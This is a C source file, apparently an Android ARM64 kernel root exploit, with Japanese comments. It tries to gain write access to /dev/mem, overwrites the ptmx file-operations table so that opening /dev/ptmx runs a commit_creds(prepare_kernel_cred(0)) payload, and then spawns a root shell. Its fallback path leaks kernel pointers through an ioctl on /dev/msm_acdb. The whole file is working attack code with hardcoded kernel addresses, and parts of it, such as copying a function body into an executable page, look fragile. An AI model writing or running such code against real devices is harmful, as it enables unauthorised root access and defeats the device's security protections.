#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdint.h>

static uint64_t commit_creds_addr = 0xffffff80080d82fc;
static uint64_t prepare_kernel_cred_addr = 0xffffff80080d87e4;

static int mem_fd = -1;

int open_mem(void) {
    mem_fd = open("/dev/mem", O_RDWR);
    if (mem_fd < 0) {
        perror("open /dev/mem (R/W)");
        mem_fd = open("/dev/mem", O_RDONLY);
        if (mem_fd < 0) {
            perror("open /dev/mem (RO)");
            return -1;
        }
        printf("[*] /dev/mem opened read-only\n");
        return 0;
    }
    printf("[+] /dev/mem opened read-write\n");
    return 1;
}

ssize_t read_kmem(uint64_t addr, void *buf, size_t len) {
    if (mem_fd < 0) return -1;
    if (lseek64(mem_fd, addr, SEEK_SET) < 0) return -1;
    return read(mem_fd, buf, len);
}

ssize_t write_kmem(uint64_t addr, void *buf, size_t len) {
    if (mem_fd < 0 || (fcntl(mem_fd, F_GETFL) & O_ACCMODE) == O_RDONLY) return -1;
    if (lseek64(mem_fd, addr, SEEK_SET) < 0) return -1;
    return write(mem_fd, buf, len);
}

#define ACDB_DEVICE "/dev/msm_acdb"
#define ACDB_CMD_GET_AUDPROC_COMMON_TABLE 0x4004730b  // 実際のioctl番号はデバイス依存

int leak_kernel_address_via_acdb(void) {
    int fd = open(ACDB_DEVICE, O_RDWR);
    if (fd < 0) {
        perror("open " ACDB_DEVICE);
        return -1;
    }

    struct {
        uint32_t cmd_id;
        uint32_t length;
        uint8_t data[0x1000];
    } __attribute__((packed)) calib = {0};
    calib.cmd_id = ACDB_CMD_GET_AUDPROC_COMMON_TABLE;
    calib.length = sizeof(calib.data);

    if (ioctl(fd, 0x4004730b, &calib) < 0) {
        perror("ioctl ACDB");
        close(fd);
        return -1;
    }

    for (int i = 0; i < sizeof(calib.data) - 8; i++) {
        uint64_t val = *(uint64_t*)(calib.data + i);
        if ((val & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
            printf("[+] Possible kernel pointer leaked: 0x%llx\n", (unsigned long long)val);
        }
    }

    close(fd);
    return 0;
}

static uint64_t ptmx_fops_addr = 0xffffff8009c5a4e0;   // kallsyms.txt から取得

void get_root_payload(void) {
    void *(*pkc)(void*) = (void* (*)(void*))prepare_kernel_cred_addr;
    void (*cc)(void*) = (void (*)(void*))commit_creds_addr;
    cc(pkc(0));
    setresuid(0,0,0);
    setresgid(0,0,0);
    setgroups(0, NULL);
}

void overwrite_ptmx_fops(void) {
    char fake_fops[0x100] = {0};
    void *exec_page = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
                           MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (exec_page == MAP_FAILED) {
        perror("mmap");
        return;
    }
    memcpy(exec_page, get_root_payload, 0x100);
    *(uint64_t*)(fake_fops + 0x38) = (uint64_t)exec_page;
    if (write_kmem(ptmx_fops_addr, fake_fops, sizeof(fake_fops)) == sizeof(fake_fops)) {
        printf("[+] ptmx_fops overwritten\n");
    } else {
        printf("[-] Failed to write ptmx_fops\n");
    }
}

int main() {
    if (getuid() == 0) {
        execl("/system/bin/sh", "sh", NULL);
        execl("/bin/sh", "sh", NULL);
        return 0;
    }

    printf("[*] Step 1: Try to open /dev/mem\n");
    int rw = open_mem();
    if (rw > 0) {
        printf("[*] /dev/mem is writable. Attempting direct root.\n");
        overwrite_ptmx_fops();
        int fd = open("/dev/ptmx", O_RDWR);
        if (fd >= 0) close(fd);
        if (getuid() == 0) {
            printf("[+] Root achieved via /dev/mem\n");
            execl("/system/bin/sh", "sh", NULL);
        } else {
            printf("[-] /dev/mem overwrite failed.\n");
        }
    } else {
        printf("[*] /dev/mem not writable. Trying ACDB info leak.\n");
        leak_kernel_address_via_acdb();
        printf("[*] No further exploit embedded. Exiting.\n");
    }
    return 0;
}
